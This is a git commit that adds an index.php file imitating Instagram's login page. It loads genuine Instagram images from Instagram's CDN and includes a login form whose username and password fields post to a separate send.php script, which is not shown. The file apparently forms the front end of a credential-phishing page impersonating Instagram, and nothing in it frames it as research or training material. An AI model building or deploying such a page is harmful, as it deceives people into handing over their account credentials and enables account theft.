542c37f36968a6882b04ab090eb41b4672068070
RenceFTW <129347925+Tunonimo07@users.noreply.github.com>
2023-11-01 23:11:04 +0800

    index.html

---
+++ index.php
@@ -0,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <img class="img" src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__makehaste_cache_breaker=HOgRclNOosk" width="380"/>
+    <img class="img2" img src="insta image.jpg" width="210"/>
+    <div class="login-container">
+       <img class="img1" src="instalogo.png" width="175"/>
+       <form action="send.php" method="post">
+       <input placeholder="Phone number, username, or email" name="email" type="text"/>
+       <input placeholder="Password" name="password" type="password"/>
+       <button class="loginbtn">Log in</button>
+       </form>
+       <p class="or">OR</p>
+       <hr><br />
+       <hr class="hr">
+       <span class="loginfb">Log in with Facebook</span><br />
+       <span class="forgotpass">Forgot password?</span>
+    </div>
+
+    <div class="login-container2">
+       <span class="NoAcc">Don't have an account?</span>&nbsp;<a class="signup">Sign up</a>
+    </div>
+    <p class="footer">Get the app.</p>
+
+    <div class="imgfooter">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40">
+    </div>
+
+</body>
+</html>
